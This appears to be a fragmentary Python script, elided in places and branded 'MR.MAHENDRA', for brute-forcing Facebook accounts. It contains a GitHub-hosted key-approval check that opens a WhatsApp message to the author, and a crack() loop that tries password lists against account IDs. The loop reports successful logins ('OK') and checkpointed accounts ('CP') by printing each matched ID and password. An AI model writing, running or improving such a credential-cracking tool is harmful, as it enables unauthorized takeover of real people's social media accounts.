...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mMAHENDRA ')
...
def xoshnaw(): 
  ...
  try: 
    httpCaht = requests.get("https://github.com/Whitedevils0/Approve.txt/blob/main/Approve.txt").text 
    if id in httpCaht: 
      ...
      os.system('xdg-open https://wa.me/+9779862781165?text=SIR+MAHENDRA+PLEASE+APPROVE+MY+KEY') 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def banner():
	...
	print("""
     ...
     SCRIPT MULTI BRUTEFORCE FOR FACEBOOK BY MR.MAHENDRA
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[MAHENDRA ]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}]×[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[MAHENDRA -CP] {idf}  {pw} {N}')     
				...
				print(f'\r{H}[MAHENDRA -OK] {idf}  {pw}')
